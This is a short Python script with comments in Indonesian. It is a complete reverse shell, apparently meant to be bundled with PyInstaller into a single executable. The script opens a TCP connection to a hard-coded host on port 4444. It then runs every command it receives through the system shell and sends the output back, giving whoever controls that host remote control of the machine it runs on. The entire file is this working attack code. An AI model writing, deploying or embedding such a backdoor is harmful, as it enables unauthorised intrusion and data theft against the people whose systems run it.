# compile: pyinstaller --onefile Testing_Payload.py

import socket  # Mengimpor modul socket untuk komunikasi jaringan
import subprocess  # Mengimpor modul subprocess untuk menjalankan perintah sistem

# Mengatur IP server dan port yang akan digunakan untuk koneksi
ip = "192.168.1.1"
port = 4444

# Membuat objek socket dengan tipe IPv4 (AF_INET) dan tipe TCP (SOCK_STREAM)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Menghubungkan ke server menggunakan IP dan port yang telah ditentukan
s.connect((ip, port))

# Memulai loop utama untuk mendengarkan perintah dari server
while True:
    # Menerima perintah dari server dengan ukuran buffer 1024 byte
    command = s.recv(1024).decode()

    # Jika perintah adalah "exit", keluar dari loop dan hentikan koneksi
    if command.lower() == "exit":
        break

    # Mencoba menjalankan perintah yang diterima dari server
    try:
        # Menjalankan perintah menggunakan subprocess dan mengambil output-nya
        # Parameter shell=True digunakan agar perintah berjalan di shell
        # stderr=subprocess.STDOUT digunakan untuk menggabungkan error ke output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        # Mengirimkan hasil output perintah kembali ke server
        s.sendall(output)
    except Exception as e:
        # Jika terjadi kesalahan saat menjalankan perintah, kirimkan pesan error ke server
        s.sendall(str(e).encode())

# Menutup koneksi socket setelah keluar dari loop
s.close()
